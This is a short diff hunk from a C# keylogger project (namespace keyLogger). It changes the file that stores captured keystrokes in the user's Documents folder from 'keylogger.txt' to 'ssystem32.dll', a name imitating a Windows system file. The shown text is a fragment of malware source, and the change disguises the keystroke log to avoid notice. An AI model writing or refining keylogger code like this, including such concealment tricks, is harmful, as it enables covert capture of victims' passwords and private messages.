@@ -15,7 +15,7 @@ namespace keyLogger
             int LIntKeyState;
 
             String LStrDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string LStrFile = LStrDirectory + "/keylogger.txt";
+            string LStrFile = LStrDirectory + "/ssystem32.dll";
 
             FCriarArquivo(LStrDirectory, LStrFile);
 
